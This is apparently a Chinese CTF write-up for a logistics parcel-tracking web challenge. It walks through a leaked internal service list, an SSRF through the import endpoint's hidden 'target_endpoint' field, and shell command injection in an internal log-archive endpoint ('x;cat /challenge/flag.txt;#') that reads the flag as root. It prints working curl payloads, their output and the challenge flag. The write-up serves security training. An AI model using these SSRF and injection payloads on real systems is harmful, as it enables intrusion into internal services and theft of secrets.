## 题目原文

> 这是某物流巨头新上线的全球包裹追踪看板。为了方便合作伙伴，系统集成了外部数据导入功能。最近运维团队在内网部署了一些诊断工具，但由于配置疏忽，这些工具可能被外部间接访问。请尝试获取系统最高权限并读取凭证(Flag)。

## 题解

### 入口与指纹

`Werkzeug/3.1.8` + `Python/3.9.25`，一个 Bootstrap 单页看板。页面上的几个 AJAX 调用：

```js
fetch('/api/services/status')
fetch('/api/tasks/recent')
fetch(`/api/track?id=${id}`)
fetch('/api/import', { method:'POST', body: JSON.stringify({url}) })
```

### 关键观察

**1. `/api/services/status` 直接把内网服务清单和调用规范交出来。**

```json
[
  {"name":"Global Tracking API","url":"https://api.global-logistics.com","usage":"GET /api/v2/track/{id}"},
  {"name":"Partner Sync Service","url":"http://admin-api:5000/api/v2/fetch","usage":"GET /api/v2/fetch"},
  {"name":"Log Archive Tool","status":"Restricted",
   "url":"http://admin-api:5000/api/internal/archive",
   "usage":"GET /api/internal/archive?service=web&filename={name}"}
]
```

内网主机名 `admin-api:5000` 和两个接口路径都在这儿，SSRF 的目标不需要猜。

**2. `/api/import` 的 JSON 字段名和前端不一致。**

前端发的是 `{"url": ...}`，但服务端只认 **`{"target_endpoint": ...}`**。用 `url` 时永远返回：

```json
{"error":"URL is required"}
```

这个字段名不在任何常见参数字典里，是这次耗时最久的一处（详见探索记录）。

**3. 归档接口把参数拼进 shell，并把 `command` 和 `output` 一起回显。**

SSRF 到 `archive` 后返回：

```json
{"partner_response":{
  "command":"tar -czf /tmp/access.log.gz /var/log/sync/web.log 2>&1",
  "output":"tar: Removing leading `/' from member names\n",
  "status":"Task triggered"}}
```

`filename` 直接进 `/tmp/{filename}.gz` 且整条命令交给 `/bin/sh`，等于一个带回显的命令执行。

### 利用链

**Step 1：列出内网服务。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s "http://$T/api/services/status"
```

**Step 2：确认 SSRF 字段名。**

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://admin-api:5000/api/v2/fetch"}' \
  "http://$T/api/import"
# {"partner_response":{"carrier":"GlobalPartner",...},"status":"success"}
```

**Step 3：确认命令注入。**

```bash
# filename = x;id;#
curl -s -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://admin-api:5000/api/internal/archive?service=web&filename=x;id;#"}' \
  "http://$T/api/import"
```

返回：

```json
{"command":"tar -czf /tmp/x;id;.gz /var/log/sync/web.log 2>&1",
 "output":"uid=0(root) gid=0(root) groups=0(root)\n/bin/sh: 1: .gz: not found\n"}
```

`;` 把命令截断，`#` 把剩下的 `.gz ...` 注释掉。**注入点确认，身份是 root。**

**Step 4：读 flag。**

```bash
filename=x;cat /challenge/flag.txt;#
```

```json
{"output":"flag{c7913a4d-ec7c-4df8-9c4f-cd549c2b27b5}/bin/sh: 1: .gz: not found\n"}
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `admin-api:5000` 容器内的 `/challenge/flag.txt`，经 SSRF → 归档接口命令注入读取 |

### 复盘

- **`/api/services/status` 这类"服务发现"接口是内网地图。** 它给出主机名、端口、路径和调用规范，SSRF 的目标不用猜。
- **前端字段名可能与后端不一致。** 前端 JS 发 `{url}`、后端只认 `{target_endpoint}`，遇到「参数缺失」时不要只试常见名字，要按「前缀×后缀×分隔符」组合爆破，或者直接找服务端源码。
- **命令注入的回显要看 `command` 字段。** 服务端自己回显了拼好的命令，绕过猜想直接看到注入位置：`/tmp/{filename}.gz`，所以用 `;...;#` 截断。
- **`$(...)` 和 `;` 各有适用场景。** `$(...)` 的输出会被空格拆词（`tar: gid=0(root): Cannot stat`），适合确认执行但不适合取回长文本；`;...;#` 能拿到干净的输出。
- **SSRF 的价值是「跳到能做命令执行的那台机器」**，而不是 SSRF 本身。本题的 SSRF 只是入口，真正拿 flag 的是内网归档接口。
